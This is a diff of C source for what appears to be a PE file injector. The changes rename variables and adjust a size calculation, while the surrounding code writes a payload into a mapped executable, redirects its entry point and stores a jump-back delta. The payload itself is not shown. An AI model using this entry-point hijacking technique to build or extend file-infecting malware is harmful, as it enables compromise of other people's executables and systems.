@@ -13,9 +13,9 @@ typedef CONST BYTE* PCBYTE;
 
 EXTERN_C_START
 extern VOID payload();
-extern LONGLONG delta2start;
+extern LONGLONG delta_start;
 extern LONGLONG to_c_code;
-extern ULONGLONG __end_code;
+extern ULONGLONG code_size;
 EXTERN_C_END
 
 VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPayload,
@@ -61,10 +61,10 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PBYTE pPaylo
     printf("New entry point: %#010x\n", dwNewEntryPoint);
 
     DWORD dwOldProtect;
-    VirtualProtect(&delta2start, sizeof(delta2start), PAGE_READWRITE, &dwOldProtect);
-    delta2start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
-    VirtualProtect(&delta2start, sizeof(delta2start), dwOldProtect, &dwOldProtect);
-    printf("delta2start: %#018llx (%lld)\n", delta2start, delta2start);
+    VirtualProtect(&delta_start, sizeof(delta_start), PAGE_READWRITE, &dwOldProtect);
+    delta_start = (LONGLONG)dwOrigEntryPoint - (LONGLONG)dwNewEntryPoint;
+    VirtualProtect(&delta_start, sizeof(delta_start), dwOldProtect, &dwOldProtect);
+    printf("delta_start: %#018llx (%lld)\n", delta_start, delta_start);
 
     printf("New payload:\n");
     HexDump(pPayload, dwPayloadSize);
@@ -79,7 +79,7 @@ int main(int argc, char* argv[]) {
     DWORD dwFileSize, dwPayloadSize;
     ULARGE_INTEGER uliSize, uliOffset;
 
-    dwPayloadSize = (DWORD)((PBYTE)&__end_code - (PBYTE)&payload + sizeof(LONGLONG));
+    dwPayloadSize = (DWORD)((PBYTE)&code_size - (PBYTE)&payload + sizeof(code_size));
     printf("Payload size: %u\n", dwPayloadSize);
     printf("Payload: %p\n", payload);
     HexDump((PCBYTE)payload, dwPayloadSize);
@@ -120,9 +120,9 @@ int main(int argc, char* argv[]) {
     }
 
     DWORD dwOldProtect;
-    VirtualProtect(&__end_code, sizeof(__end_code), PAGE_READWRITE, &dwOldProtect);
-    __end_code = dwPayloadSize;
-    VirtualProtect(&__end_code, sizeof(__end_code), dwOldProtect, &dwOldProtect);
+    VirtualProtect(&code_size, sizeof(code_size), PAGE_READWRITE, &dwOldProtect);
+    code_size = dwPayloadSize;
+    VirtualProtect(&code_size, sizeof(code_size), dwOldProtect, &dwOldProtect);
 
     VirtualProtect(&to_c_code, sizeof(to_c_code), PAGE_READWRITE, &dwOldProtect);
     to_c_code = (PBYTE)&inj_code_c - (PBYTE)&payload;
